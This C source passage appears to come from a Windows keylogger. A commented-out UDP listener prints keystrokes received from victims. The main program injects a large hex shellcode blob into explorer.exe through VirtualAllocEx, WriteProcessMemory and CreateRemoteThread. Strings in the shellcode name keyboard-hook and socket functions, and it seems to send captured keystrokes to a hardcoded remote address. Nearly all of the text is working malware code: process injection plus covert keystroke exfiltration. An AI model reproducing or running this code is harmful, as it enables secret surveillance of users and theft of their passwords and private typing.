				case VK_PLAY:       key = "[PLAY]";break;
				case VK_ZOOM:       key = "[ZOOM]";break;
				case VK_OEM_CLEAR:  key = "[CLEAR]";break;
				case VK_CANCEL:     key = "[CTRL-C]";break;

				default: key = "[UNK-KEY]";break;
			}
			return key;
}



int main()
{
	int port;
	SOCKET s;
	struct sockaddr_in sr,cr;
	WSADATA wsa;
	KEYDATA keystrk;
	char * n;

	printf("Enter Port Number To Listen: ");
	scanf("%d",&port);

	if(WSAStartup(514,&wsa))
	{
		printf("WSAStartup() Failed");
		return 0;
	}

	if((s=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP))==INVALID_SOCKET)
	{
		printf("Failed To Create Socket...");
		return 0;
	}

	ZeroMemory(&sr,16);
	sr.sin_family=AF_INET;
	sr.sin_port=htons(port);

	if(bind(s,(struct sockaddr *)&sr,16))
	{
		printf("Failed To Bind..");
		return 0;
	}

	port=16; //Why bother to declare a variable for int * fromlen
	while(1)
	{
		recvfrom(s,(char *)&keystrk,8,0,(struct sockaddr *)&cr,&port);
		n=Determine(keystrk.caps&0x0001,keystrk.shift>>15,keystrk.vkcode);
		printf("%s",n);
	}
	return 0;
}



*/


#include<windows.h>
#include<stdio.h>
#include<string.h>
#include<tlhelp32.h>

char shellcode[]="\xeb\x1d\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x40\x18\x48\x8b\x40\x20\x48\x8b\x30\x48\x8b\x06\x48\x8b\x70\x20\x5b\x53\xc3\xe8\xde\xff\xff\xff\x52\x52\x4c\x8d\x3c\x24\x48\x83\xec\x38\x4c\x8d\x24\x24\x48\x83\xec\x58\x48\x8d\x3c\x24\x41\x57\x41\x54\x57\x48\xb8\x48\x45\x52\x45\x49\x54\x49\x53\x50\x48\x31\xc0\x66\xb8\xcc\x01\x48\x01\xc3\x53\x48\x89\xf1\x48\x8d\x93\x6e\xff\xff\xff\x4d\x31\xc0\x41\xb0\x02\x49\x89\xf9\xff\xd3\x41\x5d\x48\x31\xc0\x50\x50\x48\xb8\x77\x73\x32\x5f\x33\x32\x2e\x64\x48\x89\x04\x24\x66\xc7\x44\x24\x08\x6c\x6c\x48\x8d\x0c\x24\x48\x8b\x77\x08\x48\x83\xec\x28\xff\xd6\x48\x96\x48\x8d\x4c\x24\x28\xc7\x01\x75\x73\x65\x72\xff\xd0\x48\x89\xc1\x49\x8d\x55\x8c\x4d\x31\xc0\x41\xb0\x06\x4c\x8d\x4f\x10\x41\xff\xd5\x48\x89\xf1\x49\x8d\x55\xe7\x4d\x31\xc0\x41\xb0\x03\x4c\x8d\x4f\x40\x41\xff\xd5\x48\x83\xc4\x38\x48\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x48\x83\xc1\x6a\x48\x8d\x14\x24\x48\x8b\x5f\x40\xff\xd3\x48\x31\xc9\xb1\x02\x51\x51\x5a\x41\x58\x41\xb0\x11\x48\x8b\x5f\x48\xff\xd3\x48\x89\x47\x08\x48\x8b\x1f\x48\x31\xc9\xff\xd3\x41\xc6\x07\x02\x66\x41\xc7\x47\x02\xdb\x83\x41\xc7\x47\x04\xc1\xa1\xc1\x63\x4d\x31\xc9\x41\x51\x41\x51\x59\x5a\xb1\x0d\x49\x89\xc0\xb2\xbc\x4c\x01\xea\x48\x8b\x5f\x10\xff\xd3\x49\x8d\x4c\x24\x08\x48\x31\xd2\x52\x52\x41\x58\x41\x59\x48\x8b\x5f\x28\xff\xd3\x49\x8d\x4c\x24\x08\x48\x8b\x5f\x30\xff\xd3\x49\x8d\x4c\x24\x08\x48\x8b\x5f\x38\xff\xd3\xeb\xd4\x47\x65\x74\x4d\x6f\x64\x75\x6c\x65\x48\x61\x6e\x64\x6c\x65\x41\x01\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x01\x53\x65\x74\x57\x69\x6e\x64\x6f\x77\x73\x48\x6f\x6f\x6b\x45\x78\x41\x01\x43\x61\x6c\x6c\x4e\x65\x78\x74\x48\x6f\x6f\x6b\x45\x78\x01\x47\x65\x74\x4b\x65\x79\x53\x74\x61\x74\x65\x01\x47\x65\x74\x4d\x65\x73\x73\x61\x67\x65\x41\x01\x54\x72\x61\x6e\x73\x6c\x61\x74\x65\x4d\x65\x73\x73\x61\x67\x65\x01\x44\x69\x73\x70\x61\x74\x63\x68\x4d\x65\x73\x73\x61\x67\x65\x41\x01\x57\x53\x41\x53\x74\x61\x72\x74\x75\x70\x01\x73\x6f\x63\x6b\x65\x74\x01\x73\x65\x6e\x64\x74\x6f\x01\x56\x57\x41\x50\x52\x41\x51\x51\x41\x5b\x48\x31\xdb\x53\x53\x5a\x58\x8b\x59\x3c\x48\x01\xcb\xb2\x88\x8b\x04\x13\x48\x01\xc8\x48\x31\xd2\x52\x52\x52\x41\x58\x41\x59\x41\x5a\x44\x8b\x40\x20\x4d\x01\xd8\x44\x8b\x48\x24\x4d\x01\xd9\x44\x8b\x50\x1c\x4d\x01\xda\x48\x31\xd2\x48\x31\xf6\x56\x59\x41\x8b\x34\x90\x4c\x01\xde\x48\x8b\x7c\x24\x08\x48\x31\xc0\x8a\x04\x0f\x48\xff\xc1\x3c\x01\x75\xf6\x48\xff\xc2\x51\x48\xff\xc9\x48\x87\xf7\xf3\xa6\x59\x75\xd3\x48\xff\xca\x48\x8b\x7c\x24\x08\x48\x01\xcf\x48\x89\x7c\x24\x08\x48\x31\xdb\x53\x58\x66\x41\x8b\x1c\x51\x41\x8b\x04\x9a\x4c\x01\xd8\x48\x8b\x1c\x24\x48\x89\x03\x48\x83\xc3\x08\x48\x89\x1c\x24\x48\x8b\x5c\x24\x10\x48\xff\xcb\x48\x89\x5c\x24\x10\x48\x31\xd2\x48\x39\xd3\x75\x8e\x48\x83\xc4\x18\x5f\x5e\xc3\x48\x83\xec\x58\x41\x50\x52\x51\x48\x31\xf6\x48\xb8\x48\x45\x52\x45\x49\x54\x49\x53\x4c\x8b\x14\x34\x48\xff\xc6\x49\x39\xc2\x75\xf4\x48\x83\xc6\x07\x48\x8d\x1c\x34\x48\x8b\x3b\x4c\x8b\x63\x08\x4c\x8b\x7b\x10\x48\x85\xc9\x75\x68\x48\x31\xdb\xb3\x01\x48\xc1\xe3\x08\x48\x39\xda\x75\x5a\x48\x8b\x5f\x20\x48\x31\xc9\xb1\x14\xff\xd3\x66\x41\x89\x04\x24\x48\x8b\x5f\x20\x48\x31\xc9\xb1\x10\xff\xd3\x66\x41\x89\x44\x24\x02\x48\x8b\x5c\x24\x10\x8b\x03\x41\x89\x44\x24\x04\x48\x83\xec\x58\x48\x8b\x4f\x08\x41\x54\x5a\x4d\x31\xc9\x41\x51\x41\x58\x41\xb0\x10\x4c\x89\x7c\x24\x20\x4c\x89\x44\x24\x28\x49\x83\xe8\x08\x48\x8b\x5f\x50\xff\xd3\x48\x83\xc4\x58\x5a\x41\x58\x41\x59\x48\x8b\x5f\x18\x48\x31\xc9\xff\xd3\x48\x83\xc4\x58\xc3";



int main()
{
	HANDLE s,proc;
	PROCESSENTRY32 ps;
	BOOL process_found=0;
	LPVOID shell;
	SIZE_T total;

	//finding explorer.exe pid

	ps.dwSize=sizeof(ps);

	s=CreateToolhelp32Snapshot(2,0);

	if(s==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot() failed.Error code %d\n",GetLastError());
		return -1;
	}

	if(!Process32First(s,&ps))
	{
		printf("Process32First() failed.Error code %d\n",GetLastError());
		return -1;
	}


	do{
		if(0==strcmp(ps.szExeFile,"explorer.exe"))
		{
			process_found=1;
			break;
		}
	}while(Process32Next(s,&ps));


	if(!process_found)
	{
		printf("Unknown Process\n");
		return -1;
	}


	//opening process using pid


	proc=OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID);

	if(proc==INVALID_HANDLE_VALUE)
	{
		printf("OpenProcess() failed.Error code %d\n",GetLastError());
		return -1;
	}


	//allocating memory process memory

	if( (shell=VirtualAllocEx(proc,NULL,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE)) == NULL)
	{
		printf("Failed to allocate memory into process");
		CloseHandle(proc);
		return -1;
	}


	//writing shellcode into process memory

	WriteProcessMemory(proc,shell,shellcode,sizeof(shellcode),&total);

	if(sizeof(shellcode)!=total)
	{
		printf("Failed write shellcode into process memory");
		CloseHandle(proc);
		return -1;
	}


	//Executing shellcode

	if((s=CreateRemoteThread(proc,NULL,0,(LPTHREAD_START_ROUTINE)shell,NULL,0,0))==NULL)
	{
		printf("Failed to Execute shellcode");
		CloseHandle(proc);
		return -1;
	}

	CloseHandle(proc);
	CloseHandle(s);

	return 0;


}